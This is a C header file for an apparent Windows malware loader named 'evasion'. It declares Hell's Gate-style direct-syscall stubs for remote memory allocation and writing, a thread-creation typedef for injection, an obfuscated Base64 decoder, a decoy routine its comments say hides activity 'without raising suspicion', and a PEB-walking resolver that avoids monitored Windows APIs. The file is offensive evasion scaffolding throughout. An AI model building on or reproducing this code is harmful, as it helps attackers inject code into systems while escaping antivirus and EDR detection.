#ifndef EVASION_H
#define EVASION_H

#include <windows.h>
#include <stdbool.h>
#include <stdarg.h>

#define DEBUG true // or false
typedef enum
{
    DEBUG_ERROR,
    DEBUG_INFO,
    DEBUG_SUCCESS
} DEBUG_TYPE;

void myDebug(DEBUG_TYPE type, const char *format, ...);

#define ARRAY_SIZE 1000

// Function definition for modules.
typedef HMODULE(WINAPI *pMod)(LPCSTR);
typedef FARPROC(WINAPI *pModC)(HMODULE, LPCSTR);
typedef HANDLE(WINAPI *pCRT_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

/*
Headers of assembly functions for direct syscalls.
Inspired by Hells Gate methods.
See definitions in syscalls.asm.
*/
extern NTSTATUS CustAVM(HANDLE hProcess, PVOID *BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
extern NTSTATUS CustWVM(HANDLE hProcess, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten);

// Base64Decode function
char *Bsfd(const char *encoded);

/* Decoy function
This function will generate 1,000 random numbers, sort them, and compute the average.
It looks like legitimate processing activity without raising suspicion.
*/
void SortNumbers();

/*
The GetMod function is a stealthy Windows API resolver that locates a function within a specific module without using GetModuleHandle or GetProcAddress.
Instead, it manually traverses the Process Environment Block (PEB) to extract module and export function addresses.
1 - Access the Process Environment Block (PEB)
2 - Iterate Through the PEB Loader Data (LDR)
3 - Locate the Export Address Table (EAT)
4 - Return the Function Address
*/
pMod GetMod(LPCSTR mod, LPCSTR fn);

#ifdef _M_X64
#define PEB_OFFSET 0x60
#else
#define PEB_OFFSET 0x30
#endif

#endif // EVASION_H
